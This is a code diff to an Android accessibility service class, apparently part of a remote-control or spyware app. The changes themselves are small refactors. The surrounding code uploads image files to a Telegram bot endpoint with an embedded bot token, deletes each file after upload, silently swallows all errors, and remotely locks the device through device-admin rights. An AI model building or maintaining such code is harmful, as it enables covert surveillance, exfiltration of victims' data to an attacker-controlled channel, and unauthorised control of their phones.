@@ -22,6 +22,7 @@ import android.view.accessibility.AccessibilityEvent;
 
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.nio.ByteBuffer;
 
 import okhttp3.Call;
@@ -130,8 +131,16 @@ public class AccessibilityControlService extends AccessibilityService {
                     .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                     .post(body).build();
             client.newCall(request).enqueue(new okhttp3.Callback() {
-                @Override public void onResponse(Call call, Response response) { response.close(); file.delete(); }
-                @Override public void onFailure(Call call, IOException e) {}
+                @Override
+                public void onResponse(Call call, Response response) {
+                    try {
+                        response.close();
+                    } catch (Exception e) {}
+                    file.delete();
+                }
+
+                @Override
+                public void onFailure(Call call, IOException e) {}
             });
         } catch (Exception e) {}
     }
@@ -142,8 +151,11 @@ public class AccessibilityControlService extends AccessibilityService {
         if (pm.isAdminActive(admin)) pm.lockNow();
     }
 
-    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
-    @Override public void onInterrupt() {}
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {}
+
+    @Override
+    public void onInterrupt() {}
     
     @Override
     public void onDestroy() {
